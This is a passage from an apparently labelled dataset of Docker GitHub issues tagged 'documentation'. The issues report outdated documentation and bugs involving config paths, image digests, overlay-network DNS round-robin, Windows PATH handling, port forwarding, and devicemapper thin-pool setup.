reason.\n\nSo why is the call allowed in default.json? \n"},{"labels":["documentation"],"text":"The argument to `--config` misbehave in those cases:\n\n`--config ~/.docker/` -> path is expanded by the shell and the config will be `/home/$USER/.docker/`\n`--config=~/.docker/` -> path is **not** expanded and the config will be at `~/.docker/`\n`--config=\"~/.docker/\"` -> path is **not** expanded and the config will be at `~/.docker/`\n`--config='~/.docker/'` -> path is **not** expanded and the config will be at `~/.docker/`\n\nSo the only thing which works is only the first case.\n\nYou can try it out playing around with `--config` and `--attach` for instance.\n1. Specify `detachKeys` in your `~/.docker/config.json` file\n   \n    `\"detachKeys\": \"ctrl-e,e\"`\n2. run a container with `-dit`\n3. attach to this container specifying `--config=~/.docker/`\n4. try to detach with the above sequence - it won't work\n5. try the other failing case above\n6. try with the first, working, case above where there's no `=` sign\n\nSo, the problem seems to be that `=` sign and shell expansion. Any other _relative_ path will fail the above cases of course (`../` for instance)\nNot sure what to do other that checking that the path is relative and warning the user.\n\nping @tianon @vdemeester @calavera @cpuguy83 @thaJeztah \n"},{"labels":["documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nDocker version 1.10.2, build c3959b1\n```\n\n**Steps to reproduce the issue:**\n1. Create the Dockerfile as specified in docs/admin/using_supervisord.md and the supervisors.conf\n2. Run docker build  --no-cache  -t <your name here>/supervisord .\n\n**Describe the results you received:**\nFailed to fetch http://archive.ubuntu.com/ubuntu/dists/raring/main/source/Sources  404  Not Found [IP: 91.189.91.23 80]\n\n**Describe the results you expected:**\n\nExpected the container to be built successfully\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n\nLooks as though ubuntu:13.04 repositories are no longer available. Changing the container to ubuntu:15.04 allowed the docker build to run successfully\n"},{"labels":["documentation",null],"text":"I had some trouble working out the correct way to use `docker run` with the sha256 digest. I found the documentation a little confusing with regard to this. For example the [run reference page](https://docs.docker.com/engine/reference/run) has the following example:\n\n```\n$ docker run [OPTIONS] IMAGE[:TAG|@DIGEST] [COMMAND] [ARG...]\n```\n\nHowever I had problems trying to run my image this way. For example:\n\n``` bash\ndocker run namespace/image@digest # Wrong - parse error\ndocker run namespace/image@sha256:digest # Correct\n```\n\nI had to work this out from trial and error. The link to the [Image[@digest]](https://docs.docker.com/engine/reference/run/#image-digest) section anchor doesn't have an example, which I think might have been useful. I believe therefore it might be beneficial to update the documentation regarding using digests.\n\nI suggest the **General Form** section to be:\n\n```\n$ docker run [OPTIONS] IMAGE[:TAG|@sha256:DIGEST] [COMMAND] [ARG...]\n```\n\nIf there are other possible digests, then sha256 could be changed to DIGEST_TYPE or something similar.\n\nSecondly I suggest that the [Image[@digest]](https://docs.docker.com/engine/reference/run/#image-digest) anchor have the following example of using the digest:\n\n```\ndocker run alpine@sha256:9cacb71397b640eca97488cf08582ae4e4068513101088e9f96c9814bfda95e0 date\n```\n\nThis is my feedback from initially trying to get digests to run with `docker run`. If this was confusing to me, it might possibly be confusing to other users.\n"},{"labels":["documentation"],"text":"The the Docker Remote API v1.24 (https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.24.md), the REST function,\n\nTag an image into a repository\n\ndoes not really explain what the function does.\n"},{"labels":[null,"documentation"],"text":"1 - Image ID\n\nThe spec defines “Image ID”, but then explains what a layer ID is. An image is not a layer - an image is a set of layers (per the definition of “Layer” in the same document).\n\n2 - Tag\n\nThe spec defines “Tag” as,\n\n\"A tag serves to map a descriptive, user-given name to any single image ID. An image name suffix (the name component after :) is often referred to as a tag as well, though it strictly refers to the full name of an image.\"\n\na. This is ambiguous, because the term “image ID” is ambiguous, as a result of #1.\n\nb. The term “full name of an image” is ambiguous. Does it include the namespace? The hostname/port of the registry? (e.g., when one “tags an image into a repository”)\n\n3 - Repository\n\nIt is not clear if a repository refers to an image name, or an actual image stored in a registry. It is also not clear if the “repository” is the full image name - including the repository host name - or just the name part preceding the colon at the end of the name. It is not clear if the “repository” includes the “namespace”. In fact, the term “namespace” is not mentioned in the spec, but it is clearly an important element of an image name - or is it? (This is not clear.)\n\n4 - Tagging into a repository\n\nThe image spec does not mention this, but the phrase is used in other documentation, without explanation, and it is not clear what this means, especially given the lack of clarity on what “repository” means.\n\n5 - Image \"name\"\n\nThis term is used loosely in the spec and in other documentation - including the various REST APIs, and it is highly ambiguous. Many REST APIs have “name” parameters, and it is not clear if the parameter is a repository name, or can include a final tag (with semicolon) or not - and if it can include a registry host as part of the name. The term “image name” really needs to be precisely defined and used consistently throughout the documentation - especially the REST APIs since those APIs are untyped and thus there is ample opportunity for a programmer to get it wrong.\n"},{"labels":["documentation"],"text":"Tutorial  [Work with a development container](https://docs.docker.com/opensource/project/set-up-dev-env/) talks about the **binary** directory. Current development source makes **binary-client** and **binary-daemon**. This modifies a few steps, like the one where we copy the binary file.\n\nThe documentation can benefit from updates also.\n"},{"labels":["documentation",null],"text":"**Output of `docker version`:**\n\n```\nDocker version 1.11.0, build 4dc5990\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 17\n Running: 16\n Paused: 0\n Stopped: 1\nImages: 182\nServer Version: swarm/1.2.0\nRole: primary\nStrategy: spread\nFilters: health, port, dependency, affinity, constraint\nNodes: 4\n swarm-data: 192.168.99.102:2376\n  └ Status: Healthy\n  └ Containers: 4\n  └ Reserved CPUs: 0 / 1\n  └ Reserved Memory: 0 B / 2.053 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=data\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:14Z\n  └ ServerVersion: 1.11.0\n swarm-master: 192.168.99.101:2376\n  └ Status: Healthy\n  └ Containers: 6\n  └ Reserved CPUs: 0 / 1\n  └ Reserved Memory: 0 B / 1.021 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=frontend\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:16Z\n  └ ServerVersion: 1.11.0\n swarm-node-01: 192.168.99.103:2376\n  └ Status: Healthy\n  └ Containers: 4\n  └ Reserved CPUs: 0 / 2\n  └ Reserved Memory: 0 B / 5.079 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=node\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:35Z\n  └ ServerVersion: 1.11.0\n swarm-node-02: 192.168.99.104:2376\n  └ Status: Healthy\n  └ Containers: 3\n  └ Reserved CPUs: 0 / 2\n  └ Reserved Memory: 0 B / 5.079 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=node\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:31Z\n  └ ServerVersion: 1.11.0\nPlugins: \n Volume: \n Network: \nKernel Version: 4.1.19-boot2docker\nOperating System: linux\nArchitecture: amd64\nCPUs: 6\nTotal Memory: 13.23 GiB\nName: a679a60fd15a\nDocker Root Dir: \nDebug mode (client): false\nDebug mode (server): false\nWARNING: No kernel memory limit support\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nI used docker-machine to create a swarm cluster with 4 virtualbox VM.\n\n**Steps to reproduce the issue:**\n1. \n\n```\ndocker network create -d overlay test_lb \n\n# and then in different terminals :\ndocker run --net=test_lb -h first --rm -it debian bash\ndocker run --net=test_lb --net-alias=lb -h second --rm -it debian bash\ndocker run --net=test_lb --net-alias=lb -h third --rm -it debian bash\ndocker run --net=test_lb -h fourth --rm -it debian bash\ndocker run --net=test_lb -h fifth --rm -it debian bash\ndocker run --net=test_lb -h sixth --rm -it debian bash\ndocker run --net=test_lb -h seventh --rm -it debian bash\n```\n\n2.\nThere are now 2 containers with same alias `lb` and 5 containers that are here to use ip slots in the overlay network.\nI personnaly had the following ips assigned by docker in the overlay network:\nfirst : 10.0.0.2\nsecond : 10.0.0.3\nthird : 10.0.0.4\nfourth : 10.0.0.5\nfifth : 10.0.0.6\nsixth : 10.0.0.7\nseventh : 10.0.0.8\n3.\nTry to `ping lb`from the different containers\n\n**Describe the results you received:**\nFrom first, ping always connects to `10.0.0.3` (second)\nFrom second, it always reaches itself\nFrom third, it always reaches itself\nFrom fourth through sixth, it always connects to `10.0.0.4` (third)\nFrom seventh, it connects randomly to  `10.0.0.3` or  `10.0.0.4` \n\n**Describe the results you expected:**\nI expected to always reach randomly  `10.0.0.3` or  `10.0.0.4` \n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nWith this test-case, I think that the cause of the DNS round-robin not working is due to RFC 3484 rule 9 which states that multiple A records are sorted by common prefix length, this breaks the round-robin.\n\nThis explains why seventh (`10.0.0.8`) can reach both containers because the prefix is different.\n\nThe problem is clearly caused by something other than docker but I think it completely voids the purpose of the DNS round-robin from 1.11.\n\nIf anyone can confirm the issue, is there a fix available so that the round-robin can be used in overlay networks?\n"},{"labels":["documentation",null],"text":"PLZ  forgive my poor english\n\nI used Docker Remote API to  Create an image , and post registry value (my private registry dockerregistry:5000 ) to the docker api server  like that \n\n`curl -v  -d \"fromImage=hl%2Fspark&registry=dockerregistry:5000&tag=v1.3\"     --unix-sock   /var/run/docker.sock http:/images/create`\n\nBut  the value of the registry  not worked,  and docker searchs  image from docker hub still .\n\nSo I  had to  use fromImage Query Parameter  like this\n\n`curl -v  -d \"fromImage=dockerregistry:5000/hl%2Fspark&tag=v1.3\"     --unix-sock   /var/run/docker.sock http:/images/create`\n\nand can pull image from my private registry  .\n\nThen l  go to the [https://github.com/docker/docker/blob/master/api/server/router/image/image_routes.go#L76](url) ,  and found the server did not handled Query Parameters registry .\n\nWHY ?\n"},{"labels":["documentation",null,null],"text":"I've tried various combinations of `$PATH` and `%PATH%` and `:` and `;`, but I just can't seem to get `ENV` concatenation to work with Dockerfiles for Windows.\n\nOther people seem to have given up too and just run `RUN setx`: https://github.com/StefanScherer/dockerfiles-windows/blob/197ac3a9a8fe8494915b9b62f517fa67151833cc/golang/Dockerfile#L9\n\n`setx /m` may be the most correct workaround for now.\n\n/cc @jhowardmsft @icecrime @dmp42 \n\n**Output of `docker info`:**\n\n```\ndocker info\nContainers: 71\n Running: 0\n Paused: 0\n Stopped: 71\nImages: 45\nServer Version: 1.11.0-dev\nStorage Driver: windowsfilter\n Windows:\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: null nat\nKernel Version: 10.0 14316 (14316.1000.amd64fre.rs1_release.160402-2217)\nOperating System: Windows Server 2016 Datacenter Technical Preview 5\nOSType: windows\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 1.242 GiB\nName: WIN-8F5EG07ROBB\nID: VKYM:E5F7:CMIT:4ZMS:OGUG:W43U:API4:ATWI:3S5X:RO54:DU4Q:YOFD\nDocker Root Dir: C:\\ProgramData\\docker\nDebug mode (client): false\nDebug mode (server): true\n File Descriptors: -1\n Goroutines: 24\n System Time: 2016-04-13T18:46:29.3959003-07:00\n EventsListeners: 0\nUsername: friism4test\nRegistry: https://index.docker.io/v1/\n```\n\n**Output of `docker version`:**\n\n```\ndocker version\nClient:\n Version:      1.11.0-rc3\n API version:  1.23\n Go version:   go1.5.3\n Git commit:   eabf97a\n Built:        Fri Apr  1 23:33:49 2016\n OS/Arch:      windows/amd64\n\nServer:\n Version:      1.11.0-dev\n API version:  1.24\n Go version:   go1.5.3\n Git commit:   577adcc\n Built:        Mon Apr 11 17:20:50 2016\n OS/Arch:      windows/amd64\n```\n\n**Steps to reproduce the issue:**\n\n```\n> \"FROM windowsservercore`n RUN echo %PATH%`n ENV PATH c:\\\\go\\\\bin;`$PATH\" | docker build -t test -\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM windowsservercore\n ---> e1e5fb4dbc32\nStep 2 : RUN echo %PATH%\n ---> Running in 91a3c7417bc3\nC:\\Windows\\system32;C:\\Windows;%localappdata%\\Microsoft\\WindowsApps;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\n ---> 818d81426779\nRemoving intermediate container 91a3c7417bc3\nStep 3 : ENV PATH c:\\\\go\\\\bin;$PATH\n ---> Running in f6ab92ac3110\n ---> d6b86fdef7e5\nRemoving intermediate container f6ab92ac3110\nSuccessfully built d6b86fdef7e5\n> docker run test cmd /c echo %PATH%\nc:\\go\\bin;\n```\n\n**Describe the results you received:**\n\nIncorrect PATH\n\n**Describe the results you expected:**\n\nCorrectly concatenated PATH\n"},{"labels":["documentation",null],"text":"The image spec at https://github.com/docker/docker/blob/3d13fddd2bc4d679f0eaa68b0be877e5a816ad53/image/spec/v1.md hasn't been updated for the content addressability changes that went into Docker 1.10. This spec also seems to contain some outdated fields like \"image checksum\". It shouldn't be very hard to bring this up to date. The changes in 1.10 are described in https://gist.github.com/aaronlehmann/b42a2eaf633fc949f93b#new-image-config.\n\ncc @stevvooe @tonistiigi @dmcgowan \n"},{"labels":["documentation",null],"text":"The JSON for the  [`containers/create`](https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.22.md#create-a-container) endpoint  is missing `NetworkConfig`. API versions 1.22, 1.23 and 1.24 need to be updated to contain this in the example JSON.\n\n/cc @aboch @mavenugo @dnephin  \n"},{"labels":["documentation",null],"text":"On the [official networking documentation page](https://docs.docker.com/engine/userguide/networking/default_network/container-communication/), there's a paragraph that addresses using iptables to restrict access to containers by IP:\n\n> Docker’s forward rules permit all external source IPs by default. To allow only a specific IP or network to access the containers, insert a negated rule at the top of the DOCKER filter chain. For example, to restrict external access such that only source IP 8.8.8.8 can access the containers, the following rule could be added:\n> \n> `$ iptables -I DOCKER -i ext_if ! -s 8.8.8.8 -j DROP`\n\nThis may have been true for older versions of Engine but I can't get this to work in 1.10.3. The rule is applied as advertised, it comes first in iptables -L DOCKER, but the containers are still reachable from the whole outside world. If the docs could be upgraded for the current version of Docker, that'd be very helpful. Thanks!\n"},{"labels":["documentation",null],"text":"It may just be a problem on my machine, but it seems that creating a container that sits on two networks is somehow interfering with port forwarding. The forwarding works when accessing 127.0.01, but not when accessing the IP address for another interface.\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   20f81dd\n Built:        Thu Mar 10 15:54:52 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   20f81dd\n Built:        Thu Mar 10 15:54:52 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 2\n Running: 2\n Paused: 0\n Stopped: 0\nImages: 68\nServer Version: 1.10.3\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 304\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 3.13.0-83-generic\nOperating System: Ubuntu 14.04.4 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 31.36 GiB\nName: kryton\nID: MFLN:XRFL:372N:VPKR:3AWK:USXB:3Q3E:EAH2:66ZK:T5U2:NEOP:TSCH\nUsername: bmerry\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\nPhysical machine\n\n**Steps to reproduce the issue:**\n1. Create a `docker-compose.yml` file with the following content\n\n```\nversion: \"2\"\nservices:\n    server:\n        image: nginx:1.9.12\n        networks:\n            - front\n            - back\n        ports:\n            - \"8080:80\"\nnetworks:\n    front:\n    back:\n```\n\nIn actual use, there would be other services connect to the `back` network but not the `front` network, but they're not necessary to demonstrate the bug.\n2. With docker-compose 1.6.2, run `docker-compose up`.\n3. From the host, run `curl http://localhost:8080`.\n4. From the host, run `curl http://IPADDRESS:8080`, where IPADDRESS is an IP address of a non-local interface on the machine.\n\n**Describe the results you received:**\nStep 3 spits out an HTML page from nginx. Step 4 outputs nothing and eventually times out.\n\n**Describe the results you expected:**\nStep 4 should return the same HTML page as step 3.\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nI'm not running any other firewall software on this machine. If I remove the config line putting the service on the `back` network, then the problem disappears. Similarly, if I run `docker network disconnect` to disconnect the container from the `back` network, the problem disappears, and reconnecting it makes the problem come back.\n\n**Output of iptables -vnL**:\n\n```\nChain INPUT (policy ACCEPT 4912 packets, 2311K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 DOCKER-ISOLATION  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n    0     0 DOCKER     all  --  *      br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  *      br-b81344fadd68  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n    0     0 ACCEPT     all  --  br-b81344fadd68 !br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  br-b81344fadd68 br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 DOCKER     all  --  *      br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  *      br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n    0     0 ACCEPT     all  --  br-a4d09867c7ea !br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  br-a4d09867c7ea br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 DOCKER     all  --  *      docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  *      docker0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n    0     0 ACCEPT     all  --  docker0 !docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  docker0 docker0  0.0.0.0/0            0.0.0.0/0           \n\nChain OUTPUT (policy ACCEPT 4538 packets, 674K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain DOCKER (3 references)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 ACCEPT     tcp  --  !docker0 docker0  0.0.0.0/0            172.17.0.2           tcp dpt:5000\n    0     0 ACCEPT     tcp  --  !br-a4d09867c7ea br-a4d09867c7ea  0.0.0.0/0            172.18.0.2           tcp dpt:80\n\nChain DOCKER-ISOLATION (1 references)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 DROP       all  --  br-a4d09867c7ea br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  br-b81344fadd68 br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  docker0 br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  br-b81344fadd68 docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  docker0 br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  br-a4d09867c7ea docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 RETURN     all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n```\n\n**Output of iptables -t nat -vnL**\n\n```\nhain PREROUTING (policy ACCEPT 8 packets, 536 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 DOCKER     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ADDRTYPE match dst-type LOCAL\n\nChain INPUT (policy ACCEPT 2 packets, 272 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain OUTPUT (policy ACCEPT 528 packets, 34127 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    1    60 DOCKER     all  --  *      *       0.0.0.0/0           !127.0.0.0/8          ADDRTYPE match dst-type LOCAL\n\nChain POSTROUTING (policy ACCEPT 529 packets, 34187 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 MASQUERADE  all  --  *      !br-b81344fadd68  172.19.0.0/16        0.0.0.0/0           \n    0     0 MASQUERADE  all  --  *      !br-a4d09867c7ea  172.18.0.0/16        0.0.0.0/0           \n    0     0 MASQUERADE  all  --  *      !docker0  172.17.0.0/16        0.0.0.0/0           \n    0     0 MASQUERADE  tcp  --  *      *       172.17.0.2           172.17.0.2           tcp dpt:5000\n    0     0 MASQUERADE  tcp  --  *      *       172.18.0.2           172.18.0.2           tcp dpt:80\n\nChain DOCKER (2 references)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 RETURN     all  --  br-b81344fadd68 *       0.0.0.0/0            0.0.0.0/0           \n    0     0 RETURN     all  --  br-a4d09867c7ea *       0.0.0.0/0            0.0.0.0/0           \n    0     0 RETURN     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0           \n    0     0 DNAT       tcp  --  !docker0 *       0.0.0.0/0            0.0.0.0/0            tcp dpt:5000 to:172.17.0.2:5000\n    1    60 DNAT       tcp  --  !br-a4d09867c7ea *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8080 to:172.18.0.2:80\n```\n"},{"labels":["documentation",null,null],"text":"docker build and Dockerfile does not respect VOLUME if COPY or ADD move in multiple files or a whole directory.  If a single file is specified in either COPY or ADD it works as expected.  The file is available during the build and then not present in the image.\n\n---\n## BUG REPORT INFORMATION\n\n**Output of `docker version`:**\n\n```\n\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.3\n Git commit:   a34a1d5\n Built:        Fri Nov 20 17:56:04 UTC 2015\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.10.0\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   590d5108\n Built:        2016-02-04T19:55:25.696148927+00:00\n OS/Arch:      linux/amd64\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 2\nImages: 5\nServer Version: 1.10.0\nStorage Driver: btrfs\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.3.3-dhyve\nOperating System: Buildroot 2015.11.1\nCPUs: 1\nTotal Memory: 3.86 GiB\nName: dlite\nID: MZRL:W4WC:2JDK:Z2JS:F5KM:UGUT:VFJV:ZO7M:ATVR:66HH:CS4L:5PXL\n```\n\ndlite 1.4.0\nOSx 10.11.4\n\n**Steps to reproduce the issue:**\n0. make a dir \"sample\" with a text file \"textfile.txt\" with some contents\n1. Dockerfile using an OS base and with contents\nVOLUME /opt/sample\nCOPY sample/ /opt/sample\n2. docker build volume_sample\n3. docker run -it volume_sample bash\n4. cat /opt/sample/textfile.txt\n\n**Describe the results you received:**\nthe contents of textfile.txt are output\n\n**Describe the results you expected:**\nan error of \"No such file or directory\"\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"The current documentation for setting up devicemapper is out of date. The current suggested configuration using  `dm.datadev` and `dm.metadatadev`, er the man page `man docker daemon`, are deprecated and using `dm.thinpooldev` is now the preferred method.  We should update the documentation with new best practices/starting points.\nhttps://docs.docker.com/engine/userguide/storagedriver/device-mapper-driver/#configure-direct-lvm-mode-for-production\n\nI wouldn't claim to be a LVM or devicemapper expert but I put together an example set of steps based off of `docker-storage-setup` and some other defaults that work well from my experimenting:\n\n```\n# install lvm2\nyum install lvm2\n\n# ideally, perform these tasks before you start docker for the first time OR make sure docker is stopped; all containers, images and data will be lost during this process\n\n# create a physical volume (replace /dev/sdd with your block device)\npvcreate /dev/sdd\n\n# create a volume group named 'docker' (replace /dev/sdd with your block device)\nvgcreate docker /dev/sdd\n\n# create a thin pool named 'thinpool'; in this example, the data LV is 95% of the 'docker' volume group size (leaving free space allows for auto expanding of either the data or metadata if space is runs low as a temporary stopgap)\nlvcreate --wipesignatures y -n thinpool docker -l 95%VG\nlvcreate --wipesignatures y -n thinpoolmeta docker -l 1%VG\n\n# convert the pool to a thin-pool\nlvconvert -y --zero n -c 512K --thinpool docker/thinpool --poolmetadata docker/thinpoolmeta\n\n#  configure autoextension of thin pools via a lvm profile\nvi /etc/lvm/profile/docker-thinpool.profile\n\n# specify the value for 'thin_pool_autoextend_threshold' (where the number is the % of space used before lvm attempts to autoextend the available space; 100 = disabled)\nexample:\n    thin_pool_autoextend_threshold = 80\n\n# modify the autoextend percentage for when thin pool autoextension occurs (where the number is the % of space to increase the thin pool; 100 = disabled)\nexample:\n    thin_pool_autoextend_percent = 20\n\nexample /etc/lvm/profile/docker-thinpool.profile:\nactivation {\n    thin_pool_autoextend_threshold=80\n    thin_pool_autoextend_percent=20\n}\n\n# apply the lvm profile\nlvchange --metadataprofile docker-thinpool docker/thinpool\n\n# verified the lv is monitored\nlvs -o+seg_monitor\n\n# configure docker daemon with specific devicemapper options\n--storage-driver=devicemapper --storage-opt=dm.thinpooldev=/dev/mapper/docker-thinpool --storage-opt dm.use_deferred_removal=true\n    also see `man docker daemon` for more detail on the devicemapper options used.\n\nexample daemon.json:\n{\n        \"storage-driver\": \"devicemapper\",\n        \"storage-opts\": [\n                \"dm.thinpooldev=/dev/mapper/docker-thinpool\",\n                \"dm.use_deferred_removal=true\"\n        ]\n}\n\n# if docker was previously started, clear your graph driver directory\nrm -rf /var/lib/docker/*\n\n# start docker\nsystemctl start docker\n\n# make sure to monitor your thin pool and volume group free space!  it will auto-extend but the volume group can still fill up\n# monitor logical volumes\nlvs\nlvs -a (to see the data and metadata sizes)\n\n# monitor volume group free space\nvgs\n\n# logs can show the auto-extension of the thin pool when it hits the threshold\njournalctl -fu dm-event.service\n```\n\nIt would probably also make sense to add reference about https://github.com/docker/docker/pull/20786 which will be in 1.11 as that is important, especially for a production environment.  It has a sane default but can be easily configured to meet requirements in another environment.\n"},{"labels":["documentation"],"text":"For integration and acceptance testing I want access to data from the container. I would like to use `volumes` in docker-compose file to specify the relative host path. In many occasions the host path of the volume may need to be auto-created.\n\n**Problem**\n\nAuto-creation of the host path in a volume appears to be DEPRECATED, as stated in documentation [here](https://docs.docker.com/engine/userguide/containers/dockervolumes/#auto-creating-missing-host-paths-for-bind-mounts):\n\n> The directory on the host must be specified as an absolute path and if the directory doesn’t exist Docker will automatically create it for you. This auto-creation of the host path has been deprecated.\n\nThe documentation does not explain what will be the future behaviour. Will we get an error, or will the volume just not mount? Is there an additional flag to get auto-creation back, etc?\n\n**Desired outcome**\n- Describe the new behaviour in more detail. What should we use?\n- Update the documentation page at https://docs.docker.com/engine/userguide/containers/dockervolumes/ accordingly\n\nThanks!\n"},{"labels":["documentation",null],"text":"**Output of `docker version`:**\n\n```\nClient version: 1.7.1\nClient API version: 1.19\nGo version (client): go1.6\nGit commit (client): 786b29d\nOS/Arch (client): darwin/amd64\nServer version: 1.10.3\nServer API version: 1.22\nGo version (server): go1.5.3\nGit commit (server): 20f81dd\nOS/Arch (server): linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 6\nImages: 1\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 14\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.19-boot2docker\nOperating System: Boot2Docker 1.10.3 (TCL 6.4.1); master : 625117e - Thu Mar 10 22:09:02 UTC 2016\nCPUs: 2\nTotal Memory: 1.955 GiB\nName: 1.10.3-vmware\nID: NYFA:XWPO:HDL2:SDNL:LWHQ:WPS2:SU2X:IHRA:K5F3:5XJ2:RGZJ:HWTK\nDebug mode (server): true\nFile Descriptors: 25\nGoroutines: 38\nSystem Time: 2016-03-29T19:59:33.113353448Z\nEventsListeners: 0\nInit SHA1:\nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\nUsername: dxia\nRegistry: https://index.docker.io/v1/\nLabels:\n provider=vmwarefusion\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. do a docker exec create\n2. do docker exec start\n3. docker exec inspect\n\n```\ncurl --insecure --cert ~/.docker/machine/machines/1.10.3-vmware/b2d-client-side.p12 --pass tcuser 'https://192.168.212.133:2376/exec/f33bbfb39f5b142420f4759b2348913bd4a8d1a6d7fd56499cb41a1bb91d7b3b/json' -vvv\n\n*   Trying 192.168.212.133...\n* Connected to 192.168.212.133 (192.168.212.133) port 2376 (#0)\n* WARNING: SSL: Certificate type not set, assuming PKCS#12 format.\n* Client certificate: dxia\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n* Server certificate: dxia.1.10.3-vmware\n* Server certificate: dxia\n> GET 